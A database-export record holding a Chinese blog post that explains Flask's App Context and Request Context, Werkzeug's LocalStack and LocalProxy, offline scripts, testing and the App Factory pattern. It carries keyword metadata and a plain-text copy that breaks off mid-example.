<tt class="docutils literal">User.query.get(user_id)</tt>，就会遇到 <tt class="docutils literal">RuntimeError</tt>。因为此时 App Context 还没被推入栈中，而 Flask-SQLAlchemy 需要数据库连接信息时就会去取 <tt class="docutils literal">current_app.config</tt>，current_app 指向的却是 <tt class="docutils literal">_app_ctx_stack</tt> 为空的栈顶。</p>\n<p>解决的办法是运行脚本正文之前，先将 App 的 App Context 推入栈中，栈顶不为空后 <tt class="docutils literal">current_app</tt> 这个 Local Proxy 对象就自然能将“取 config 属性” 的动作转发到当前 App 上了：</p>\n<figure class="code"><figcaption><span>Python Shell</span></figcaption><div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">ctx</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">()</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">ctx</span><span class="o">.</span><span class="n">push</span><span class="p">()</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">_app_ctx_stack</span><span class="o">.</span><span class="n">top</span>\n<span class="o">&lt;</span><span class="n">flask</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">AppContext</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x102eac7d0</span><span class="o">&gt;</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">_app_ctx_stack</span><span class="o">.</span><span class="n">top</span> <span class="ow">is</span> <span class="n">ctx</span>\n<span class="bp">True</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">current_app</span>\n<span class="o">&lt;</span><span class="n">Flask</span> <span class="s">''__main__''</span><span class="o">&gt;</span>\n<span class="o">&gt;&gt;&gt;</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">ctx</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">_app_ctx_stack</span><span class="o">.</span><span class="n">top</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">current_app</span>\n<span class="o">&lt;</span><span class="n">LocalProxy</span> <span class="n">unbound</span><span class="o">&gt;</span>\n</pre></div>\n</figure><p>那么为什么在应用运行时不需要手动 <tt class="docutils literal"><span class="pre">app_context().push()</span></tt> 呢？因为 Flask App 在作为 WSGI Application 运行时，会在每个请求进入的时候将请求上下文推入 <tt class="docutils literal">_request_ctx_stack</tt> 中，而请求上下文一定是 App 上下文之中，所以推入部分的逻辑有这样一条：如果发现 <tt class="docutils literal">_app_ctx_stack</tt> 为空，则隐式地推入一个 App 上下文。</p>\n<p>所以，请求中是不需要手动推上下文入栈的，但是离线脚本需要手动推入 App Context。如果没有什么特殊困难，我更建议用 Flask-Script 来写离线任务。<a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id17" id="id7">[7]</a></p>\n</div>\n<div class="section" id="id8">\n<h2>两个疑问</h2>\n<p>到此为止，就出现两个疑问：</p>\n<ul class="simple">\n<li>为什么 App Context 要独立出来：既然在 Web 应用运行时里，App Context 和 Request Context 都是 Thread Local 的，那么为什么还要独立二者？</li>\n<li>为什么要放在“栈”里：在 Web 应用运行时中，一个线程同时只处理一个请求，那么 <tt class="docutils literal">_req_ctx_stack</tt> 和 <tt class="docutils literal">_app_ctx_stack</tt> 肯定都是只有一个栈顶元素的。那么为什么还要用“栈”这种结构？</li>\n</ul>\n<p>我最初也被这两个疑问困惑过。后来看了一些资料，就明白了 Flask 为何要设计成这样。这两个做法给予我们 <strong>多个 Flask App 共存</strong> 和 <strong>非 Web Runtime 中灵活控制 Context</strong> 的可能性。</p>\n<p>我们知道对一个 Flask App 调用 <tt class="docutils literal">app.run()</tt> 之后，进程就进入阻塞模式并开始监听请求。此时是不可能再让另一个 Flask App 在主线程运行起来的。那么还有哪些场景需要多个 Flask App 共存呢？前面提到了，一个 Flask App 实例就是一个 WSGI Application，那么 WSGI Middleware 是允许使用组合模式的，比如：</p>\n<figure class="code"><figcaption><span>wsgi</span></figcaption><div class="highlight"><pre><span class="kn">from</span> <span class="nn">werkzeug.wsgi</span> <span class="kn">import</span> <span class="n">DispatcherMiddleware</span>\n<span class="kn">from</span> <span class="nn">biubiu.app</span> <span class="kn">import</span> <span class="n">create_app</span>\n<span class="kn">from</span> <span class="nn">biubiu.admin.app</span> <span class="kn">import</span> <span class="n">create_app</span> <span class="k">as</span> <span class="n">create_admin_app</span>\n\n<span class="n">application</span> <span class="o">=</span> <span class="n">DispatcherMiddleware</span><span class="p">(</span><span class="n">create_app</span><span class="p">(),</span> <span class="p">{</span>\n    <span class="s">''/admin''</span><span class="p">:</span> <span class="n">create_admin_app</span><span class="p">()</span>\n<span class="p">})</span>\n</pre></div>\n</figure><p>这个例子就利用 Werkzeug 内置的 Middleware 将两个 Flask App 组合成一个一个 WSGI Application。这种情况下两个 App 都同时在运行，只是根据 URL 的不同而将请求分发到不同的 App 上处理。</p>\n<div class="note">\n<p class="first admonition-title">Note</p>\n<p class="last">需要注意的是，这种用法和 Flask 的 Blueprint 是有区别的。Blueprint 虽然和这种用法很类似，但前者自己没有 App Context，只是同一个 Flask App 内部整理资源的一种方式，所以多个 Blueprint 可能共享了同一个 Flask App；后者面向的是所有 WSGI Application，而不仅仅是 Flask App，即使是把一个 Django App 和一个 Flask App 用这种用法整合起来也是可行的。</p>\n</div>\n<p>如果仅仅在 Web Runtime 中，多个 Flask App 同时工作倒不是问题。毕竟每个请求被处理的时候是身处不同的 Thread Local 中的。但是 Flask App 不一定仅仅在 Web Runtime 中被使用 —— 有两个典型的场景是在非 Web 环境需要访问上下文代码的，一个是离线脚本（前面提到过），另一个是测试。这两个场景即所谓的“Running code outside of a request”。</p>\n</div>\n<div class="section" id="web-flask">\n<h2>在非 Web 环境运行 Flask 关联的代码</h2>\n<p>离线脚本或者测试这类非 Web 环境和和 Web 环境不同 —— 前者一般只在主线程运行。</p>\n<p>设想，一个离线脚本需要操作两个 Flask App 关联的上下文，应该怎么办呢？这时候栈结构的 App Context 优势就发挥出来了。</p>\n<figure class="code"><figcaption><span>offline_script.py</span></figcaption><div class="highlight"><pre><span class="kn">from</span> <span class="nn">biubiu.app</span> <span class="kn">import</span> <span class="n">create_app</span>\n<span class="kn">from</span> <span class="nn">biubiu.admin.app</span> <span class="kn">import</span> <span class="n">create_app</span> <span class="k">as</span> <span class="n">create_admin_app</span>\n\n<span class="n">app</span> <span class="o">=</span> <span class="n">create_app</span><span class="p">()</span>\n<span class="n">admin_app</span> <span class="o">=</span> <span class="n">create_admin_app</span><span class="p">()</span>\n\n<span class="k">def</span> <span class="nf">copy_data</span><span class="p">():</span>\n    <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>\n        <span class="n">data</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">()</span>  <span class="c"># fake function for demo</span>\n        <span class="k">with</span> <span class="n">admin_app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>\n            <span class="n">write_data</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  <span class="c"># fake function for demo</span>\n        <span class="n">mark_data_copied</span><span class="p">()</span>  <span class="c"># fake function for demo</span>\n</pre></div>\n</figure><p>无论有多少个 App，只要主动去 Push 它的 App Context，Context Stack 中就会累积起来。这样，栈顶永远是当前操作的 App Context。当一个 App Context 结束的时候，相应的栈顶元素也随之出栈。如果在执行过程中抛出了异常，对应的 App Context 中注册的 <tt class="docutils literal">teardown</tt> 函数被传入带有异常信息的参数。</p>\n<p>这么一来就解释了两个疑问 —— 在这种单线程运行环境中，只有栈结构才能保存多个 Context 并在其中定位出哪个才是“当前”。而离线脚本只需要 App 关联的上下文，不需要构造出请求，所以 App Context 也应该和 Request Context 分离。</p>\n<p>另一个手动推入 Context 的场景是测试。测试中我们可能会需要构造一个请求，并验证相关的状态是否符合预期。例如：</p>\n<figure class="code"><figcaption><span>tests.py</span></figcaption><div class="highlight"><pre><span class="k">def</span> <span class="nf">test_app</span><span class="p">():</span>\n    <span class="n">app</span> <span class="o">=</span> <span class="n">create_app</span><span class="p">()</span>\n    <span class="n">client</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">test_client</span><span class="p">()</span>\n    <span class="n">resp</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">''/''</span><span class="p">)</span>\n    <span class="k">assert</span> <span class="s">''Home''</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">data</span>\n</pre></div>\n</figure><p>这里调用 <tt class="docutils literal">client.get</tt> 时，Request Context 就被推入了。其特点和 App Context 非常类似，这里不再赘述。</p>\n</div>\n<div class="section" id="app-factory">\n<h2>为何建议使用 App Factory 模式</h2>\n<p>从官方文档来看，Flask 有 Singleton 和 App Factory 两种用法。前一种用法和其他的一些 Web 框架（如 Bottle、Sinatra）的门面广告很相似，因为代码精简，所以显得非常的“帅”：</p>\n<figure class="code"><figcaption><span>app.py</span></figcaption><div class="highlight"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span>\n<span class="kn">from</span> <span class="nn">flask.ext.sqlalchemy</span> <span class="kn">import</span> <span class="n">SQLAlchemy</span>\n<span class="kn">from</span> <span class="nn">flask.ext.login</span> <span class="kn">import</span> <span class="n">LoginManager</span>\n\n<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>\n<span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>\n<span class="n">login_manager</span> <span class="o">=</span> <span class="n">LoginManager</span><span class="p">()</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">''/''</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>\n    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">''home.html''</span><span class="p">)</span>\n</pre></div>\n</figure><p>但是这种“帅”是有代价的。一个最麻烦的问题就是编写测试的时候：</p>\n<figure class="code"><figcaption><span>test_app.py</span></figcaption><div class="highlight"><pre><span class="k">class</span> <span class="nc">TestApp</span><span class="p">(</span><span class="n">unittest</span><span class="o">.</span><span class="n">TestCase</span><span class="p">):</span>\n\n    <span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>\n    <span class="n">TESTING</span> <span class="o">=</span> <span class="bp">True</span>\n    <span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="bp">None</span>\n\n    <span class="k">def</span> <span class="nf">setUp</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">app</span> <span class="o">=</span> <span class="n">create_app</span><span class="p">()</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">from_object</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">test_client</span><span class="p">()</span>\n\n    <span class="k">def</span> <span class="nf">test_app</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="nd">@self.app.route</span><span class="p">(</span><span class="s">''/test/&lt;int:id_&gt;''</span><span class="p">)</span>\n        <span class="k">def</span> <span class="nf">my_view</span><span class="p">(</span><span class="n">id_</span><span class="p">):</span>\n            <span class="k">return</span> <span class="s">''#</span><span class="si">%d</span><span class="s">''</span> <span class="o">%</span> <span class="n">id_</span>\n        <span class="n">resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">''/test/42''</span><span class="p">)</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">assertEqual</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="s">''#42''</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">test_home</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="n">resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">''/''</span><span class="p">)</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">assertIn</span><span class="p">(</span><span class="s">''Welcome''</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>\n</pre></div>\n</figure><p>在上面的例子中，我为了测试给 App 新挂载了一个 View 函数。这是很常见的一个测试需求。但是如果 Flask App 实例是单例的，这种做法就会“弄脏”下一个测试的运行。更加麻烦的是，上述例子中如果 <tt class="docutils literal">test_home</tt> 在 <tt class="docutils literal">test_app</tt> 之前运行了，Flask 的开发者防御机制会认为这是一个“已经开始处理 Web 请求了，又挂载了视图” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id18" id="id9">[8]</a> 的失误，从而抛出 <tt class="docutils literal">RuntimeError</tt>。</p>\n<p>所以除非是应用简单到不需要 Web 层测试，否则还是尽量使用 App Factory 模式比较好。况且配合 Blueprint 的情况下，App Factory 还能帮助我们良好地组织应用结构：</p>\n<figure class="code"><figcaption><span>happytree/app.py</span></figcaption><div class="highlight"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>\n<span class="kn">from</span> <span class="nn">werkzeug.utils</span> <span class="kn">import</span> <span class="n">import_string</span>\n\n<span class="n">extensions</span> <span class="o">=</span> <span class="p">[</span>\n    <span class="s">''happytree.ext:db''</span><span class="p">,</span>\n    <span class="s">''happytree.ext:login_manager''</span><span class="p">,</span>\n<span class="p">]</span>\n<span class="n">blueprints</span> <span class="o">=</span> <span class="p">[</span>\n    <span class="s">''happytree.views:bp''</span><span class="p">,</span>\n<span class="p">]</span>\n\n\n<span class="k">def</span> <span class="nf">create_app</span><span class="p">():</span>\n    <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>\n    <span class="k">for</span> <span class="n">ext_name</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">:</span>\n        <span class="n">ext</span> <span class="o">=</span> <span class="n">import_string</span><span class="p">(</span><span class="n">ext_name</span><span class="p">)</span>\n        <span class="n">ext</span><span class="o">.</span><span class="n">init_app</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>\n    <span class="k">for</span> <span class="n">bp_name</span> <span class="ow">in</span> <span class="n">blueprints</span><span class="p">:</span>\n        <span class="n">bp</span> <span class="o">=</span> <span class="n">import_string</span><span class="p">(</span><span class="n">bp_name</span><span class="p">)</span>\n        <span class="n">app</span><span class="o">.</span><span class="n">register_blueprint</span><span class="p">()</span>\n    <span class="k">return</span> <span class="n">app</span>\n</pre></div>\n</figure><p>这样就能彻底摆脱 <tt class="docutils literal">app.py</tt> 和 View 模块“互相 Import”的纠结了。</p>\n<p>好吧其实这一节和 Context 没啥关系……</p>\n</div>\n<div class="section" id="id10">\n<h2>拖延不好</h2>\n<p>这篇文章动笔开始写是 6 月 21 日，到今天发布出来，已经过去了整整一个月。而事实上我开始列提纲准备写这篇文章已经是三四月份的事情了。</p>\n<p><cite>_(:з」∠)_</cite></p>\n<table class="docutils footnote" frame="void" id="id11" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id1">[1]</a></td><td>Flask 文档对 <a class="reference external" href="http://flask.pocoo.org/docs/appcontext/">Application Context</a> 和 <a class="reference external" href="http://flask.pocoo.org/docs/reqcontext/">Request Context</a> 作出了详尽的解释；</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id12" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[2]</a></td><td>通过访问 <tt class="docutils literal">flask.current_app</tt>；</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id13" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[3]</a></td><td>通过访问 <tt class="docutils literal">flask.request</tt>；</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id14" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[4]</a></td><td>Flask(Werkzeug) 的 Context 基于 Thread Local 和代理模式实现，只要身处 Context 中就能用近似访问全局变量的的方式访问到上下文信息，例如 <tt class="docutils literal">flask.current_app</tt> 和 <tt class="docutils literal">flask.request</tt>；Django 和 Tornado 则将上下文封装在对象中，只有明确获取了相关上下文对象才能访问其中的信息，例如在视图函数中或按照规定模板实现的 Middleware 中；</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id15" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id5">[5]</a></td><td>基于 Flask 的 Web 应用可以在 Gevent 或 Eventlet 异步网络库 patch 过的 Python 环境中正常工作。这二者都使用 Greenlet 而不是系统线程作为调度单元，而 Werkzeug 考虑到了这点，在 Greenlet 可用时用 Greenlet ID 代替线程 ID。</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id16" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id6">[6]</a></td><td>Python 的对象方法是 Descriptior 实现的，所以方法就是一种属性；而 Python 的二元操作可以用双下划线开头和结尾的一系列协议，所以 <tt class="docutils literal">foo + bar</tt> 等同于 <tt class="docutils literal">foo.__add__(bar)</tt>，本质还是属性访问。</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id17" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id7">[7]</a></td><td><a class="reference external" href="http://flask-script.readthedocs.org/">Flask-Script</a> 是一个用来写 <tt class="docutils literal">manage.py</tt> 管理脚本的 Flask 扩展，用它运行的任务会在开始前自动推入 App Context。将来这个“运行任务”的功能将被整合到 Flask 内部。</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id18" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id9">[8]</a></td><td>详见 Flask 源码中的 <tt class="docutils literal">setup_method</tt> 装饰器。</td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2014-07-20 16:07:00', '2014-07-20 16:07:00', 0, '[["app", 0.4548009376103261], ["App", 0.3313549688303804], ["Flask", 0.32485781257880436], ["Context", 0.27288056256619564], ["Local", 0.14293743753467392], ["ctx", 0.13644028128309782], ["stack", 0.11694881252836956], ["import", 0.11045165627679347], ["Web", 0.10395450002521739], ["\\u7ebf\\u7a0b", 0.10395450002521739], ["__", 0.0974573437736413], ["flask", 0.09096018752206522], ["self", 0.09096018752206522], ["create", 0.08446303127048913], ["\\u4e0a\\u4e0b\\u6587", 0.08388391091820653], ["Thread", 0.07146871876733696], ["\\u5bf9\\u8c61", 0.0705313743616087], ["\\u63a8\\u5165", 0.06765858996130435], ["\\u4e00\\u4e2a", 0.06737621889876087], ["\\u8bf7\\u6c42", 0.06573724462961414]]', NULL, NULL, 'TL;DR 文长慎入\n用过 Flask 做 Web 开发的同学应该不会不记得 App Context 和 Request Context 这两个名字——这两个 Context 算是 Flask 中比较特色的设计。[1]\n从一个 Flask App 读入配置并启动开始，就进入了 App Context，在其中我们可以访问配置文件、打开资源文件、通过路由规则反向构造 URL。[2] 当一个请求进入开始被处理时，就进入了 Request Context，在其中我们可以访问请求携带的信息，比如 HTTP Method、表单域等。[3]\n所以，这两个 Context 也成了 Flask 框架复杂度比较集中的地方，对此有评价认为 Flask 的这种设计比 Django、Tornado 等框架的设计更为晦涩。[4] 我不认同这种评价。对于一个 Web 应用来说，“应用” 和 “请求” 的两级上下文在理念上是现实存在的，如果理解了它们，那么使用 Flask 并不会晦涩；即使是使用 Django、Tornado，理解了它们的 Context 也非常有利于做比官网例子更多的事情（例如编写 Middleware）。\n我因为开发 Flask 扩展，对这两个 Context 的具体实现也研究了一番，同时还解决了一些自己之前“知道结论不知道过程”的疑惑，所以撰写本文记录下来。\n\nThread Local 的概念\n从面向对象设计的角度看，对象是保存“状态”的地方。Python 也是如此，一个对象的状态都被保存在对象携带的一个特殊字典中，可以通过 vars 函数拿到它。\nThread Local 则是一种特殊的对象，它的“状态”对线程隔离 —— 也就是说每个线程对一个 Thread Local 对象的修改都不会影响其他线程。这种对象的实现原理也非常简单，只要以线程的 ID 来保存多份状态字典即可，就像按照门牌号隔开的一格一格的信箱。\n在 Python 中获得一个这样的 Thread Local 最简单的方法是 threading.local()：\nPython Shell>>> import threading\n>>> storage = threading.local()\n>>> storage.foo = 1\n>>> print(storage.foo)\n1\n>>> class AnotherThread(threading.Thread):\n...     def run(self):\n...         storage.foo = 2\n...         print(storage.foo)  # 这这个线程里已经修改了\n>>>\n>>> another = AnotherThread()\n>>> another.start()\n2\n>>> print(storage.foo)  # 但是在主线程里并没有修改\n1\n\n这样来说，只要能构造出 Thread Local 对象，就能够让同一个对象在多个线程下做到状态隔离。这个“线程”不一定要是系统线程，也可以是用户代码中的其他调度单元，例如 Greenlet。[5]\n\n\nWerkzeug 实现的 Local Stack 和 Local Proxy\nWerkzeug 没有直接使用 threading.local，而是自己实现了 werkzeug.local.Local 类。后者和前者有一些区别：\n\n后者会在 Greenlet 可用的情况下优先使用 Greenlet 的 ID 而不是线程 ID 以支持 Gevent 或 Eventlet 的调度，前者只支持多线程调度；\n后者实现了 Werkzeug 定义的协议方法 __release_local__，可以被 Werkzeug 自己的 release_pool 函数释放（析构）掉当前线程下的状态，前者没有这个能力。\n\n除 Local 外，Werkzeug 还实现了两种数据结构：LocalStack 和 LocalProxy。\nLocalStack 是用 Local 实现的栈结构，可以将对象推入、弹出，也可以快速拿到栈顶对象。当然，所有的修改都只在本线程可见。和 Local 一样，LocalStack 也同样实现了支持 release_pool 的接口。\nLocalProxy 则是一个典型的代理模式实现，它在构造时接受一个 callable 的参数（比如一个函数），这个参数被调用后的返回值本身应该是一个 Thread Local 对象。对一个 LocalProxy 对象的所有操作，包括属性访问、方法调用（当然方法调用就是属性访问）甚至是二元操作 [6] 都会转发到那个 callable 参数返回的 Thread Local 对象上。\nLocalProxy 的一个使用场景是 LocalStack 的 __call__ 方法。比如 my_local_stack 是一个 LocalStack 实例，那么 my_local_stack() 能返回一个 LocalProxy 对象，这个对象始终指向 my_local_stack 的栈顶元素。如果栈顶元素不存在，访问这个 LocalProxy 的时候会抛出 RuntimeError。\n\n\nFlask 基于 Local Stack 的 Context\nFlask 是一个基于 Werkzeug 实现的框架，所以 Flask 的 App Context 和 Request Context 也理所当然地基于 Werkzeug 的 Local Stack 实现。\n在概念上，App Context 代表了“应用级别的上下文”，比如配置文件中的数据库连接信息；Request Context 代表了“请求级别的上下文”，比如当前访问的 URL。\n这两种上下文对象的类定义在 flask.ctx 中，它们的用法是推入 flask.globals 中创建的 _app_ctx_stack 和 _request_ctx_stack 这两个单例 Local Stack 中。因为 Local Stack 的状态是线程隔离的，而 Web 应用中每个线程（或 Greenlet）同时只处理一个请求，所以 App Context 对象和 Request Context 对象也是请求间隔离的。\n当 app = Flask(__name__) 构造出一个 Flask App 时，App Context 并不会被自动推入 Stack 中。所以此时 Local Stack 的栈顶是空的，current_app 也是 unbound 状态。\nPython Shell>>> from flask import Flask\n>>> from flask.globals import _app_ctx_stack, _request_ctx_stack\n>>>\n>>> app = Flask(__name__)\n>>> _app_ctx_stack.top\n>>> _request_ctx_stack.top\n>>> _app_ctx_stack()\n<LocalProxy unbound>\n>>>\n>>> from flask import current_app\n>>> current_app\n<LocalProxy unbound>\n\n这也是一些 Flask 用户可能被坑的地方 —— 比如编写一个离线脚本时，如果直接在一个 Flask-SQLAlchemy 写成的 Model 上调用 User.query.get(user_id)，就会遇到 RuntimeError。因为此时 App Context 还没被推入栈中，而 Flask-SQLAlchemy 需要数据库连接信息时就会去取 current_app.config，current_app 指向的却是 _app_ctx_stack 为空的栈顶。\n解决的办法是运行脚本正文之前，先将 App 的 App Context 推入栈中，栈顶不为空后 current_app 这个 Local Proxy 对象就自然能将“取 config 属性” 的动作转发到当前 App 上了：\nPython Shell>>> ctx = app.app_context()\n>>> ctx.push()\n>>> _app_ctx_stack.top\n<flask.ctx.AppContext object at 0x102eac7d0>\n>>> _app_ctx_stack.top is ctx\nTrue\n>>> current_app\n<Flask ''__main__''>\n>>>\n>>> ctx.pop()\n>>> _app_ctx_stack.top\n>>> current_app\n<LocalProxy unbound>\n\n那么为什么在应用运行时不需要手动 app_context().push() 呢？因为 Flask App 在作为 WSGI Application 运行时，会在每个请求进入的时候将请求上下文推入 _request_ctx_stack 中，而请求上下文一定是 App 上下文之中，所以推入部分的逻辑有这样一条：如果发现 _app_ctx_stack 为空，则隐式地推入一个 App 上下文。\n所以，请求中是不需要手动推上下文入栈的，但是离线脚本需要手动推入 App Context。如果没有什么特殊困难，我更建议用 Flask-Script 来写离线任务。[7]\n\n\n两个疑问\n到此为止，就出现两个疑问：\n\n为什么 App Context 要独立出来：既然在 Web 应用运行时里，App Context 和 Request Context 都是 Thread Local 的，那么为什么还要独立二者？\n为什么要放在“栈”里：在 Web 应用运行时中，一个线程同时只处理一个请求，那么 _req_ctx_stack 和 _app_ctx_stack 肯定都是只有一个栈顶元素的。那么为什么还要用“栈”这种结构？\n\n我最初也被这两个疑问困惑过。后来看了一些资料，就明白了 Flask 为何要设计成这样。这两个做法给予我们 多个 Flask App 共存 和 非 Web Runtime 中灵活控制 Context 的可能性。\n我们知道对一个 Flask App 调用 app.run() 之后，进程就进入阻塞模式并开始监听请求。此时是不可能再让另一个 Flask App 在主线程运行起来的。那么还有哪些场景需要多个 Flask App 共存呢？前面提到了，一个 Flask App 实例就是一个 WSGI Application，那么 WSGI Middleware 是允许使用组合模式的，比如：\nwsgifrom werkzeug.wsgi import DispatcherMiddleware\nfrom biubiu.app import create_app\nfrom biubiu.admin.app import create_app as create_admin_app\n\napplication = DispatcherMiddleware(create_app(), {\n    ''/admin'': create_admin_app()\n})\n\n这个例子就利用 Werkzeug 内置的 Middleware 将两个 Flask App 组合成一个一个 WSGI Application。这种情况下两个 App 都同时在运行，只是根据 URL 的不同而将请求分发到不同的 App 上处理。\n\nNote\n需要注意的是，这种用法和 Flask 的 Blueprint 是有区别的。Blueprint 虽然和这种用法很类似，但前者自己没有 App Context，只是同一个 Flask App 内部整理资源的一种方式，所以多个 Blueprint 可能共享了同一个 Flask App；后者面向的是所有 WSGI Application，而不仅仅是 Flask App，即使是把一个 Django App 和一个 Flask App 用这种用法整合起来也是可行的。\n\n如果仅仅在 Web Runtime 中，多个 Flask App 同时工作倒不是问题。毕竟每个请求被处理的时候是身处不同的 Thread Local 中的。但是 Flask App 不一定仅仅在 Web Runtime 中被使用 —— 有两个典型的场景是在非 Web 环境需要访问上下文代码的，一个是离线脚本（前面提到过），另一个是测试。这两个场景即所谓的“Running code outside of a request”。\n\n\n在非 Web 环境运行 Flask 关联的代码\n离线脚本或者测试这类非 Web 环境和和 Web 环境不同 —— 前者一般只在主线程运行。\n设想，一个离线脚本需要操作两个 Flask App 关联的上下文，应该怎么办呢？这时候栈结构的 App Context 优势就发挥出来了。\noffline_script.pyfrom biubiu.app import create_app\nfrom biubiu.admin.app import create_app as create_admin_app\n\napp = create_app()\nadmin_app = create_admin_app()\n\ndef copy_data():\n    with app.app_context():\n        data = read_data()  # fake function for demo\n        with admin_app.app_context():\n            write_data(data)  # fake function for demo\n        mark_data_copied()  # fake function for demo\n\n无论有多少个 App，只要主动去 Push 它的 App Context，Context Stack 中就会累积起来。这样，栈顶永远是当前操作的 App Context。当一个 App Context 结束的时候，相应的栈顶元素也随之出栈。如果在执行过程中抛出了异常，对应的 App Context 中注册的 teardown 函数被传入带有异常信息的参数。\n这么一来就解释了两个疑问 —— 在这种单线程运行环境中，只有栈结构才能保存多个 Context 并在其中定位出哪个才是“当前”。而离线脚本只需要 App 关联的上下文，不需要构造出请求，所以 App Context 也应该和 Request Context 分离。\n另一个手动推入 Context 的场景是测试。测试中我们可能会需要构造一个请求，并验证相关的状态是否符合预期。例如：\ntests.pydef test_app():\n    app = create_app()\n    client = app.test_client()\n    resp = client.get(''/'')\n    assert ''Home'' in resp.data\n\n这里调用 client.get 时，Request Context 就被推入了。其特点和 App Context 非常类似，这里不再赘述。\n\n\n为何建议使用 App Factory 模式\n从官方文档来看，Flask 有 Singleton 和 App Factory 两种用法。前一种用法和其他的一些 Web 框架（如 Bottle、Sinatra）的门面广告很相似，因为代码精简，所以显得非常的“帅”：\napp.pyfrom flask import Flask, render_template\nfrom flask.ext.sqlalchemy import SQLAlchemy\nfrom flask.ext.login import LoginManager\n\napp = Flask(__name__)\ndb = SQLAlchemy(app)\nlogin_manager = LoginManager()\n\n@app.route(''/'')\ndef home():\n    return render_template(''home.html'')\n\n但是这种“帅”是有代价的。一个最麻烦的问题就是编写测试的时候：\ntest_app.pyclass TestApp(unittest.TestCase):\n\n   